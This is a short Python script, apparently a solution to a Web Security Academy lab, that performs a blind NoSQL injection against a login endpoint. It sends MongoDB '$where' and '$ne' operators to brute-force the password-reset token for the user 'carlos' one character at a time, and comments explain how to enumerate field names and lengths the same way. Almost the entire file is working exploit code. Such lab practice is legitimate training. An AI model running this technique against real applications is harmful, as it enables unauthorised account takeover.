import string
import requests
import json

char_lst = string.digits + string.ascii_letters

target_url = 'https://0af600e604e2e68480e70865000100f5.web-security-academy.net'
target_login = '/login'
target_fgpass = '/forgot-password'

header_login = {
    'Cookie': 'session=dB3kIIlZtkoK0vzZwv3lboaNQio1lXqO',           # Change this
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Content-Type': 'application/json',
}

fieldname = ''

# Finding all field name and their value
"""
    length field 0 = 3,         "...id"
    length field 1 & 2 = 8,     "username", "password"
    length field 3 = 5          "email"
    length field 4 = 9          "forgotPwd"
    length value field 4 = 16   "0-10, 13, 14" alpha; "
"""
"""
    "$where": "Object.keys(this)[...].match('^.{0}a.*')": find field's name
    "$where": "Object.keys(this)[...].length == ...: find length of field
    "$where": "this.forgotPwd.length == ...": find length of token
    "$where": "this.forgotPwd.match('^.{0}a.*')": find token
"""
for check_pos in range(0, 16):           # Remember to change length of each field
    for check_var in char_lst:
        payload_login = {
            "username":"carlos",
            "password":{
                "$ne":""
            },
            "$where": "this.forgotPwd.match('^.{" + str(check_pos) + "}" + check_var + ".*')"
        }
        print('Payload of $where: ' + payload_login["$where"])
        print('[!] Testing char: ' + check_var)
        login_r = requests.post(url=target_url+target_login, headers=header_login, data=json.dumps(payload_login))
        # print(login_r.text)
        if 'Account locked:' in login_r.text:
            print('\033[92m[+] Founded char: ' + check_var + '\033[0m')
            fieldname += check_var
            break

print('Field name: ' + fieldname)